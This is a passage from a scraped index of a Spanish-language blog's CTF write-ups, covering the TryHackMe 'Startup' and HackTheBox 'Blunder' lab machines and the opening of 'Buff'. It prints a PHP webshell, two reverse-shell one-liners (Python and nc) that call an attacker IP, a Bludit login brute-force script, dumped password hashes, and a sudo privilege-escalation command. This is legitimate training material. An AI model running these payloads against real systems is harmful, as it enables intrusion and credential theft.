(Status: 200) /server-status (Status: 403) kali@kali:~/thm/startup$   Como indicaba el mensaje en uno de los archivos, se muestran archivos (que se encuentran en el servicio FTP) en la pagina web.\nWWW-DATA - USER Mediante una mini webshell ejecutamos comandos en la maquina, subiendo esta en la carpeta ftp/ del servicio FTP, ya que tenemos acceso mediante el \u0026ldquo;usuario\u0026rdquo; anonymous.\n1  \u0026lt;?php echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt;   Mini webshell a la carpeta ftp/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 3 65534 65534 4096 Nov 12 04:53 . drwxr-xr-x 3 65534 65534 4096 Nov 12 04:53 .. -rw-r--r-- 1 0 0 5 Nov 12 04:53 .test.log drwxrwxrwx 2 65534 65534 4096 Nov 12 04:53 ftp -rw-r--r-- 1 0 0 251631 Nov 12 04:02 important.jpg -rw-r--r-- 1 0 0 208 Nov 12 04:53 notice.txt 226 Directory send OK. ftp\u0026gt; cd ftp 250 Directory successfully changed. ftp\u0026gt; put shell.php5 local: shell.php5 remote: shell.php5 200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 45 bytes sent in 0.00 secs (392.3689 kB/s) ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 2 65534 65534 4096 Dec 09 08:01 . drwxr-xr-x 3 65534 65534 4096 Nov 12 04:53 .. -rwxrwxr-x 1 112 118 45 Dec 09 08:01 shell.php5 226 Directory send OK. ftp\u0026gt;   El archivo se muestra en la direccion de la pagina /files/ftp.\nAl ejecutar un comando se muestra en pantalla.\nEjecutamos una shell inversa y ponemos a la escucha netcat en el puerto especificado.\nN: \u0026ldquo;Es posible ejecutar la shell inversa insertando esta en el codigo de la mini webshell.\u0026quot;\n1  python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.10.10\u0026#34;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;   Obtenemos una shell con usuario www-data.\nEn la maquina encontramos algunos archivos interesantes, el primero solo menciona un ingrediente principal, el segundo es un archivo de captura de paquetes.\n1 2 3 4 5 6 7 8 9 10 11 12  www-data@startup:/$ cat recipe.txt cat recipe.txt Someone asked what our main ingredient to our spice soup is today. I figured I can\u0026#39;t keep it a secret forever and told him it was ... spoiler ... . www-data@startup:/$ www-data@startup:/incidents$ ls -lah ls -lah total 40K drwxr-xr-x 2 www-data www-data 4.0K Nov 12 04:53 . drwxr-xr-x 25 root root 4.0K Dec 9 07:39 .. -rwxr-xr-x 1 www-data www-data 31K Nov 12 04:53 suspicious.pcapng www-data@startup:/incidents$   Utilizamos wireshark para analizar el segundo archivo, en dicho archivo encontramos que se subió y se ejecutaron comandos mediante una shell, en los comandos encontrados se muestra la contraseña que aparentemente es del usuario Lennie.\nLENNIE - USER Utilizamos esta contraseña para cambiar al usuario Lennie y obtener nuestra flag user.txt.\nPRIVILEGE ESCALATION Realizamos una pequeña enumeracion en la carpeta del usuario Lennie y encontramos archivos que son propiedad del usuario root, en el primero de ellos realiza un echo al archivo startup_list.txt y ejecuta el archivo /etc/print.sh el cual contiene un echo, el segundo archivo (startup_list.txt) no contiene nada.\n1 2 3 4 5 6 7 8 9 10 11 12 13  lennie@startup:~/scripts$ cat planner.sh #!/bin/bash echo $LIST \u0026gt; /home/lennie/scripts/startup_list.txt /etc/print.sh lennie@startup:~/scripts$ cat startup_list.txt lennie@startup:~/scripts$ lennie@startup:~/scripts$ ls -lah /etc/print.sh -rwx------ 1 lennie lennie 25 Nov 12 04:53 /etc/print.sh lennie@startup:~/scripts$ cat /etc/print.sh #!/bin/bash echo \u0026#34;Done!\u0026#34; lennie@startup:~/scripts$   Ejecutamos pspy para verificar si el archivo planner.sh es ejecutado por algun cron del usuario root, lo cual se confirmo.\nYa que el archivo print.sh es propiedad del archivo Lennie, vamos a editar este e insertar una shell inversa y poner a la escucha netcat en el puerto especificado.\n1  echo \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.10.10 1338 \u0026gt;/tmp/f\u0026#34; \u0026gt;\u0026gt; /etc/print.sh   Obtenemos una shell con el usuario root y nuestra flat root.txt.\n","description":"Startup es una maquina de TryHackMe utilizamos FTP para subir una webshell para luego obtener una shell. Accedimos con un segundo usuario analizando un archivo PCAP. Finalmente ejecutamos una shell inversa editando un script utilizado por un CronJob.","id":32,"section":"posts","tags":["pspy","webshell","wireshark"],"title":"TryHackMe - Startup","uri":"https://sckull.github.io/posts/startup/"},{"content":"  Blunder es una maquina de HackTheBox, Bludit CMS esta corriendo y su version tiene multiples vulnerabilidades, aprovechamos una de ellas para realizar un ataque de contraseñas utilizando un diccionario generado con Cewl, luego ejecutamos una shell inversa. Realizamos movimiento lateral con contraseñas almacenadas por Bludit. Una vulnerabilidad de sudo nos permitió obtener acceso privilegiado.\nInformacion de la Maquina    Nombre Blunder      OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.191   Maker egotisticalSW    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[6.5, 5.9, 7.3, 2.7, 4.1], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[1, 10, 10, 0, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  # Nmap 7.80 scan initiated Sat Sep 12 11:24:58 2020 as: nmap -p- --min-rate 1000 -o allports blunder.htb Nmap scan report for blunder.htb (10.10.10.191) Host is up (0.16s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 21/tcp closed ftp 80/tcp open http # Nmap done at Sat Sep 12 11:27:10 2020 -- 1 IP address (1 host up) scanned in 131.60 seconds # Nmap 7.80 scan initiated Sat Sep 12 11:29:31 2020 as: nmap -sV -sC -p 21,80 -o servicesports blunder.htb Nmap scan report for blunder.htb (10.10.10.191) Host is up (0.18s latency). PORT STATE SERVICE VERSION 21/tcp closed ftp 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-generator: Blunder |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Blunder | A blunder of interesting facts Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Sep 12 11:29:45 2020 -- 1 IP address (1 host up) scanned in 14.12 seconds   HTTP Encontramos una pagina web en el puerto 80, donde vemos varios posts publicados por algun usuario.\nDIRSEARCH Utilizamos dirsearch para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160  _|. _ _ _ _ _ _|_ v0.3.9 (_||| _) (/_(_|| (_| ) Extensions: | HTTP method: GET | Suffixes: php, html, txt | Threads: 75 | Wordlist size: 6564 | Request count: 6564 Error Log: /home/kali/tools/dirsearch/logs/errors-20-09-12_14-01-21.log Target: http://blunder.htb/ Output File: /home/kali/tools/dirsearch/reports/blunder.htb/20-09-12_14-01-21 [14:01:21] Starting: [14:01:27] 200 - 954B - /.github/ [14:01:28] 403 - 276B - /.htaccess.save [14:01:28] 403 - 276B - /.httr-oauth [14:01:28] 403 - 276B - /.htaccess.sample [14:01:28] 403 - 276B - /.htaccessBAK [14:01:28] 403 - 276B - /.htaccessOLD [14:01:28] 403 - 276B - /.htaccess.orig [14:01:29] 403 - 276B - /.htaccessOLD2 [14:01:29] 403 - 276B - /.htaccess.bak1 [14:01:30] 403 - 276B - /.php [14:01:34] 200 - 7KB - /%3f/ [14:01:34] 200 - 7KB - /0 [14:01:40] 200 - 3KB - /about [14:01:45] 200 - 2KB - /admin/_logs/login.txt [14:01:45] 200 - 2KB - /admin/?/login [14:01:45] 200 - 2KB - /admin/_logs/access_log [14:01:45] 200 - 2KB - /admin/_logs/access-log [14:01:45] 200 - 2KB - /admin/.config [14:01:45] 200 - 2KB - /admin/.htaccess [14:01:45] 200 - 2KB - /admin/access_log [14:01:45] 200 - 2KB - /admin/access.txt [14:01:45] 200 - 2KB - /admin/access.log [14:01:45] 200 - 2KB - /admin/account [14:01:45] 200 - 2KB - /admin/account.php [14:01:45] 200 - 2KB - /admin/account.html [14:01:45] 200 - 2KB - /admin/admin [14:01:45] 200 - 2KB - /admin/admin_login [14:01:45] 200 - 2KB - /admin/admin_login.php [14:01:45] 200 - 2KB - /admin/admin-login [14:01:45] 200 - 2KB - /admin/admin-login.html [14:01:45] 200 - 2KB - /admin/admin.html [14:01:45] 200 - 2KB - /admin/admin.php [14:01:45] 200 - 2KB - /admin/admin.shtml [14:01:45] 200 - 2KB - /admin/backup/ [14:01:45] 200 - 2KB - /admin/controlpanel [14:01:45] 200 - 2KB - /admin/controlpanel.php [14:01:45] 200 - 2KB - /admin/controlpanel.htm [14:01:45] 200 - 2KB - /admin/cp [14:01:45] 200 - 2KB - /admin/cp.php [14:01:45] 200 - 2KB - /admin/cp.html [14:01:45] 200 - 2KB - /admin/db/ [14:01:45] 200 - 2KB - /admin/error.log [14:01:45] 200 - 2KB - /admin/error.txt [14:01:46] 200 - 2KB - /admin/export.php [14:01:46] 200 - 2KB - /admin/FCKeditor [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp [14:01:46] 200 - 2KB - /admin/admin_login.html [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/connectors/asp/connector.asp [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/connectors/asp/upload.asp [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/connectors/aspx/connector.aspx [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/connectors/aspx/upload.aspx [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/connectors/php/connector.php [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/connectors/php/upload.php [14:01:46] 200 - 2KB - /admin/admin-login.php [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/upload/asp/upload.asp [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/upload/aspx/upload.aspx [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/upload/php/upload.php [14:01:46] 200 - 2KB - /admin/files.php [14:01:46] 200 - 2KB - /admin/file.php [14:01:46] 200 - 2KB - /admin/adminLogin.php [14:01:46] 200 - 2KB - /admin/home [14:01:46] 200 - 2KB - /admin/_logs/error-log [14:01:46] 200 - 2KB - /admin/home.html [14:01:46] 200 - 2KB - /admin/includes/configure.php~ [14:01:46] 200 - 2KB - /admin/index.php [14:01:46] 200 - 2KB - /admin/index.asp [14:01:46] 200 - 2KB - /admin/index.html [14:01:46] 200 - 2KB - /admin/log [14:01:46] 200 - 2KB - /admin/login.html [14:01:46] 200 - 2KB - /admin/login.jsp [14:01:46] 200 - 2KB - /admin/login.py [14:01:46] 200 - 2KB - /admin/login.rb [14:01:46] 200 - 2KB - /admin/logon.jsp [14:01:46] 200 - 2KB - /admin/logs/ [14:01:46] 200 - 2KB - /admin/logs/access.log [14:01:46] 200 - 2KB - /admin/logs/access_log [14:01:46] 200 - 2KB - /admin/logs/access-log [14:01:46] 200 - 2KB - /admin/logs/err.log [14:01:46] 200 - 2KB - /admin/_logs/error.log [14:01:46] 200 - 2KB - /admin/home.php [14:01:46] 200 - 2KB - /admin/logs/error-log [14:01:46] 200 - 2KB - /admin/controlpanel.html [14:01:46] 200 - 2KB - /admin/default [14:01:46] 200 - 2KB - /admin/default/login.asp [14:01:46] 200 - 2KB - /admin/logs/login.txt [14:01:46] 200 - 2KB - /admin/default.asp [14:01:47] 200 - 2KB - /admin/default/admin.asp [14:01:47] 200 - 2KB - /admin/dumper/ [14:01:47] 200 - 2KB - /admin/download.php [14:01:47] 200 - 2KB - /admin/manage [14:01:47] 200 - 2KB - /admin/manage.asp [14:01:47] 200 - 2KB - /admin/mysql/ [14:01:47] 200 - 2KB - /admin/phpmyadmin/ [14:01:47] 301 - 0B - /admin -\u0026gt; http://10.10.10.191/admin/ [14:01:47] 200 - 2KB - /admin/sqladmin/ [14:01:47] 200 - 2KB - /admin/tinymce [14:01:47] 200 - 2KB - /admin/web/ [14:01:47] 200 - 2KB - /admin/index [14:01:47] 200 - 2KB - /admin/js/tiny_mce [14:01:47] 200 - 2KB - /admin/js/tinymce/ [14:01:47] 200 - 2KB - /admin/js/tinymce [14:01:47] 200 - 2KB - /admin/js/tiny_mce/ [14:01:47] 200 - 2KB - /admin/login [14:01:47] 200 - 2KB - /admin/login.do [14:01:47] 200 - 2KB - /admin/login.htm [14:01:47] 200 - 2KB - /admin/login.php [14:01:47] 200 - 2KB - /admin/error_log [14:01:47] 200 - 2KB - /admin/manage/login.asp [14:01:47] 200 - 2KB - /admin/manage/admin.asp [14:01:47] 200 - 2KB - /admin/logs/error_log [14:01:47] 200 - 2KB - /admin/logs/error.log [14:01:48] 200 - 2KB - /admin/phpMyAdmin [14:01:48] 200 - 2KB - /admin/adminLogin.html [14:01:48] 200 - 2KB - /admin/release [14:01:48] 200 - 2KB - /admin/login.asp [14:01:48] 200 - 2KB - /admin/adminLogin.htm [14:01:48] 200 - 2KB - /admin/signin [14:01:48] 200 - 2KB - /admin/sxd/ [14:01:48] 200 - 2KB - /admin/sysadmin/ [14:01:48] 200 - 2KB - /admin/_logs/err.log [14:01:48] 200 - 2KB - /admin/_logs/error_log [14:01:48] 200 - 2KB - /admin/backups/ [14:01:48] 200 - 2KB - /admin/config.php [14:01:49] 200 - 2KB - /admin/uploads.php [14:01:49] 200 - 2KB - /admin/upload.php [14:01:49] 200 - 2KB - /admin/user_count.txt [14:01:49] 200 - 2KB - /admin/tiny_mce [14:01:49] 200 - 2KB - /admin/ [14:01:49] 200 - 2KB - /admin/_logs/access.log [14:01:50] 200 - 2KB - /admin/pol_log.txt [14:01:50] 200 - 2KB - /admin/private/logs [14:01:50] 200 - 2KB - /admin/scripts/fckeditor [14:01:50] 200 - 2KB - /admin/pma/ [14:01:50] 200 - 2KB - /admin/secure/logon.jsp [14:01:55] 200 - 2KB - /admin/admin/login [14:02:05] 200 - 2KB - /admin/adminLogin [14:02:10] 301 - 0B - /domcfg.nsf/?open -\u0026gt; http://10.10.10.191/domcfg.nsf [14:02:23] 200 - 30B - /install.php [14:02:27] 200 - 1KB - /LICENSE [14:02:43] 200 - 22B - /robots.txt [14:02:46] 403 - 276B - /server-status [14:02:47] 403 - 276B - /server-status/ [14:02:55] 200 - 118B - /todo.txt Task Completed   En todo.txt encontramos una lista de cosas por hacer y vemos en una que aparece el nombre de un posible usuario fergus.\n1 2 3 4 5 6  kali@kali:~/htb/blunder$ curl http://blunder/todo.txt -Update the CMS -Turn off FTP - DONE -Remove old users - DONE -Inform fergus that the new blog needs images - PENDING kali@kali:~/htb/blunder$   BLUDIT - VULNERABLE Dentro del panel de admin logramos ver el titulo y en la cookie muestra el nombre Bludit, investigamos este y encontramos que pertenece a Bludit CMS. Exploramos las vulnerabilidades de este CMS y encontramos que es posible realizar un ataque de fuerza bruta.\nConfiguramos el exploit para usar un wordlist. Luego de utilizar algunos wordlist no encontramos la contraseña para el usuario fergus, utilizar el wordlist rockyou.txt no seria una buena idea ya que comunmente las maquinas de HTB no necesitan un wordlist muy grande.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  #!/usr/bin/env python3 import re import requests host = \u0026#39;http://10.10.10.191\u0026#39; login_url = host + \u0026#39;/admin/login\u0026#39; username = \u0026#39;fergus\u0026#39; wordlist = open(\u0026#39;/usr/share/nmap/nselib/data/passwords.lst\u0026#39;) for password in wordlist: password = password.strip() session = requests.Session() login_page = session.get(login_url) csrf_token = re.search(\u0026#39;input.+?name=\u0026#34;tokenCSRF\u0026#34;.+?value=\u0026#34;(.+?)\u0026#34;\u0026#39;, login_page.text).group(1) print(\u0026#39;[*] Trying: {p}\u0026#39;.format(p = password)) headers = { \u0026#39;X-Forwarded-For\u0026#39;: password, \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36\u0026#39;, \u0026#39;Referer\u0026#39;: login_url } data = { \u0026#39;tokenCSRF\u0026#39;: csrf_token, \u0026#39;username\u0026#39;: username, \u0026#39;password\u0026#39;: password, \u0026#39;save\u0026#39;: \u0026#39;\u0026#39; } login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False) if \u0026#39;location\u0026#39; in login_result.headers: if \u0026#39;/admin/dashboard\u0026#39; in login_result.headers[\u0026#39;location\u0026#39;]: print() print(\u0026#39;SUCCESS: Password found!\u0026#39;) print(\u0026#39;Use {u}:{p} to login.\u0026#39;.format(u = username, p = password)) print() break   En la pagina de inicio vemos varios posts, utilizamos estos para crear un wordlist para posible contraseñas al igual que en HTB - VAULT.\n1 2 3 4 5  kali@kali:~/htb/blunder$ cewl -w bludit-word.txt -e -a http://blunder.htb CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/) kali@kali:~/htb/blunder$ wc -l bludit-word.txt 329 bludit-word.txt kali@kali:~/htb/blunder$   Ejecutamos nuevamente el exploit, esta vez con nuestro wordlist y logramos ver la contraseña de este usuario.\n1 2 3 4 5 6 7 8  kali@kali:~/htb/blunder$ python3 bludit_brute_force.py [... REDACTED ...] [*] Trying: RolandDeschain SUCCESS: Password found! Use fergus:RolandDeschain to login. kali@kali:~/htb/blunder$   Ingresamos con las credenciales encontradas y vemos el dashboard de este CMS.\nAdemás de el exploit anterior encontramos otro el cual sube un archivo con una shell inversa. Tambien existe otro el cual ejecuta una shell inversa realizando todos los pasos para la explotacion, pasos que el exploit de exploit-db no realiza. Configuamos este ultimo exploit, ponemos a la escucha netcat, ejecutamos y logramos obtener una shell con usuario www-data.\nHUGO - USER Realizamos una enumeracion en la maquina y encontramos dos versiones de Blundit en ambas carpetas encontramos un archivo de Blundit unas credenciales de usuarios de este CMS.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ ls -lah ls -lah total 80K drwxr-xr-x 3 www-data www-data 4.0K May 19 11:28 . drwxr-xr-x 7 www-data www-data 4.0K Nov 27 2019 .. -rw-r--r-- 1 www-data www-data 438 Apr 28 11:24 categories.php -rw-r--r-- 1 www-data www-data 3.4K Apr 28 11:35 pages.php drwxr-xr-x 6 www-data www-data 4.0K Nov 27 2019 plugins -rw-r--r-- 1 www-data www-data 42K Sep 12 19:40 security.php -rw-r--r-- 1 www-data www-data 1.3K May 19 11:28 site.php -rw-r--r-- 1 www-data www-data 2.3K Apr 28 11:24 syslog.php -rw-r--r-- 1 www-data www-data 52 Apr 28 11:24 tags.php -rw-r--r-- 1 www-data www-data 1.3K Apr 28 11:20 users.php www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ cat users.php cat users.php \u0026lt;?php defined(\u0026#39;BLUDIT\u0026#39;) or die(\u0026#39;Bludit CMS.\u0026#39;); ?\u0026gt; { \u0026#34;admin\u0026#34;: { \u0026#34;nickname\u0026#34;: \u0026#34;Admin\u0026#34;, \u0026#34;firstName\u0026#34;: \u0026#34;Administrator\u0026#34;, \u0026#34;lastName\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;bfcc887f62e36ea019e3295aafb8a3885966e265\u0026#34;, \u0026#34;salt\u0026#34;: \u0026#34;5dde2887e7aca\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;registered\u0026#34;: \u0026#34;2019-11-27 07:40:55\u0026#34;, \u0026#34;tokenRemember\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;tokenAuth\u0026#34;: \u0026#34;b380cb62057e9da47afce66b4615107d\u0026#34;, \u0026#34;tokenAuthTTL\u0026#34;: \u0026#34;2009-03-15 14:00\u0026#34;, \u0026#34;twitter\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;facebook\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;instagram\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;codepen\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;linkedin\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;github\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;gitlab\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;fergus\u0026#34;: { \u0026#34;firstName\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;lastName\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;nickname\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;author\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7\u0026#34;, \u0026#34;salt\u0026#34;: \u0026#34;jqxpjfnv\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;registered\u0026#34;: \u0026#34;2019-11-27 13:26:44\u0026#34;, \u0026#34;tokenRemember\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;tokenAuth\u0026#34;: \u0026#34;0e8011811356c0c5bd2211cba8c50471\u0026#34;, \u0026#34;tokenAuthTTL\u0026#34;: \u0026#34;2009-03-15 14:00\u0026#34;, \u0026#34;twitter\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;facebook\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;codepen\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;instagram\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;github\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;gitlab\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;linkedin\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;mastodon\u0026#34;: \u0026#34;\u0026#34; } }www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ ls -lah ls -lah total 80K drwxr-xr-x 3 www-data www-data 4.0K May 19 10:10 . drwxr-xr-x 7 www-data www-data 4.0K May 19 10:03 .. -rw-r--r-- 1 www-data www-data 438 May 19 10:03 categories.php -rw-r--r-- 1 www-data www-data 3.4K May 19 10:03 pages.php drwxr-xr-x 6 www-data www-data 4.0K May 19 10:03 plugins -rw-r--r-- 1 www-data www-data 42K May 19 10:03 security.php -rw-r--r-- 1 www-data www-data 1.3K May 19 10:03 site.php -rw-r--r-- 1 www-data www-data 2.3K May 19 10:03 syslog.php -rw-r--r-- 1 www-data www-data 52 May 19 10:03 tags.php -rw-r--r-- 1 www-data www-data 597 May 19 10:10 users.php www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php cat users.php \u0026lt;?php defined(\u0026#39;BLUDIT\u0026#39;) or die(\u0026#39;Bludit CMS.\u0026#39;); ?\u0026gt; { \u0026#34;admin\u0026#34;: { \u0026#34;nickname\u0026#34;: \u0026#34;Hugo\u0026#34;, \u0026#34;firstName\u0026#34;: \u0026#34;Hugo\u0026#34;, \u0026#34;lastName\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;User\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;faca404fd5c0a31cf1897b823c695c85cffeb98d\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;registered\u0026#34;: \u0026#34;2019-11-27 07:40:55\u0026#34;, \u0026#34;tokenRemember\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;tokenAuth\u0026#34;: \u0026#34;b380cb62057e9da47afce66b4615107d\u0026#34;, \u0026#34;tokenAuthTTL\u0026#34;: \u0026#34;2009-03-15 14:00\u0026#34;, \u0026#34;twitter\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;facebook\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;instagram\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;codepen\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;linkedin\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;github\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;gitlab\u0026#34;: \u0026#34;\u0026#34;} } www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$   Utilizamos la pagina de crackstation para obtener la contraseña del usuario hugo.\nCambiamos de usuario utilizando la contraseña encontrada y logramos obtener nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando /bin/bash. Pero al ejecutarlo nos muestra un mensaje de error. Utilizamos la misma forma utilizada en THM - Agent Sudo para obtener nuestra shell con root y flag root.txt.\n1  sudo -u#-1 /bin/bash   FREE FLAG (?) Encontramos en la carpeta Pictures de shaun unos screenshots, en uno de ellos vemos la flag root.txt con un \u0026ldquo;poc\u0026rdquo; de lo que parece ser una explotacion binaria y en otro un archivo de configuracion.\n1 2 3 4 5 6 7  www-data@blunder:/home/shaun/Pictures$ ls -lah ls -lah total 624K drwxr-xr-x 2 shaun shaun 4.0K Nov 28 2019 . drwxr-xr-x 16 shaun shaun 4.0K Apr 28 12:13 .. -rw-r--r-- 1 shaun shaun 441K Nov 28 2019 \u0026#39;Screenshot from 2019-11-28 13-17-29.png\u0026#39; -rw-r--r-- 1 shaun shaun 171K Nov 28 2019 \u0026#39;Screenshot from 2019-11-28 14-02-13.png\u0026#39;   ","description":"Blunder es una maquina de HackTheBox, Bludit CMS esta corriendo y su version tiene multiples vulnerabilidades, aprovechamos una de ellas para realizar un ataque de contraseñas utilizando un diccionario generado con Cewl, luego ejecutamos una shell inversa. Realizamos movimiento lateral con contraseñas almacenadas por Bludit. Una vulnerabilidad de sudo nos permitió obtener acceso privilegiado.","id":33,"section":"posts","tags":["dirsearch","sudo privesc"],"title":"Hack The Box - Blunder","uri":"https://sckull.github.io/posts/blunder/"},{"content":"  Buff es una maquina de HackTheBox con SO Windows, encontramos un RCE en Gym Managmente Software lo que nos dio acceso con el usuario Shaun. Observamos un puerto localmente perteneciente a CloudMe, ejecutamos un reverse tunneling para poder explotar la vulnerabilidad Buffer Overflow y obtener acceso privilegiado.\nInformacion de la Maquina    Nombre Buff      OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.198   Maker egotisticalSW    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { 